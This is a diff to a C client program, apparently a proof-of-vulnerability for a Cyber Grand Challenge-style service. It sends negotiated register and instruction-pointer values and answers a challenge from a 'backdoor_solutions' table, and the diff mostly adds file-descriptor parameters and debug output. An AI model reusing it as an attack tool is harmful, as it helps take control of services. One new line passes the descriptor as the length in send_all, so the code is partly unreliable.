@@ -42,14 +42,14 @@ int send_all(int fd, const void *msg, size_t n_bytes)
   return 0;
 }
 
-void send_str(unsigned char* str){
-  send_all(1,(unsigned char*)str,strlen((char*)str));
+void send_str(unsigned char* str,int fd){
+  send_all(fd,(unsigned char*)str,strlen((char*)str));
   return;
 }
 
-void send_str_nl(unsigned char* str){
-  send_str(str);
-  send_all(1,"\n",1);
+void send_str_nl(unsigned char* str,int fd){
+  send_str(str,fd);
+  send_all(fd,"\n",fd);
   return;
 }
 
@@ -95,6 +95,9 @@ size_t receive_until_str(int fd, char *dst, const char* delim, int delim_length,
             delim_idx += 1;
         }else{
             delim_idx = 0;
+            if( c == delim[0] ){
+              delim_idx += 1;
+            }
         }
         if ( delim_idx == delim_length ){
           goto end;
@@ -141,7 +144,7 @@ unsigned int receive_int_nl(){
   }
   return result;
 }
-void send_int_nl(uint32_t input){
+void send_int_nl(uint32_t input,int fd){
   unsigned char tmp[9];
   unsigned int nibble;
   tmp[8] = '\x00';
@@ -155,9 +158,9 @@ void send_int_nl(uint32_t input){
       tmp[c] = nibble+55;;
     input >>= 4;
   }
-  send_str_nl(tmp);
+  send_str_nl(tmp,fd);
 }
-void send_int_space(uint32_t input){
+void send_int_space(uint32_t input,int fd){
   unsigned char tmp[9];
   unsigned int nibble;
   tmp[8] = '\x00';
@@ -171,8 +174,8 @@ void send_int_space(uint32_t input){
       tmp[c] = nibble+55;;
     input >>= 4;
   }
-  send_str(tmp);
-  send_str((unsigned char*)" ");
+  send_str(tmp,fd);
+  send_str((unsigned char*)" ",fd);
 }
 
 enum register_t
@@ -363,11 +366,16 @@ int main() {
   }
   sleep(1,0); //wait a superstitious second
   // send_all(2,(void*)"111\n",4);
-  len = receive_until_str(1,big_buffer,"\x04\xd0\xcc\xba",4,100000);
+  len = receive_until_str(0,big_buffer,"\x04\xd0\xcc\xba",4,100000);
+  send_all(2,(void*)("---------------\n"),16);
   // send_all(2,(void*)"333\n",4);
-  //send_all(2,(void*)(&big_buffer[len-4-4+1]),4);
+  // send_all(2,(void*)(&big_buffer[len-4-4+1]),4);
   // send_all(2,(void*)"444\n",4);
   memcpy((void*) (&challenge), (void *)(&(big_buffer[len-4-4+1])),4);
+  send_int_nl(len,2);
+  send_int_nl(challenge,2);
+  send_all(2,(void*)("---------------\n"),16);
+  // this is crashing if we receive a wrong challenge, we do not care
   res = &(backdoor_solutions[challenge*5]);
   // endianness is crazy
   response[0] = res[3];
@@ -384,7 +392,6 @@ int main() {
   memcpy((void*) (&(response[8])), (void *)(&(negotiated_vals.regval)),4);
   memcpy((void*) (&(response[12])), (void *)(&(negotiated_vals.ipval)),4);
   send_all(1,(void*)(response),16);
-
   return 0;
 }
 
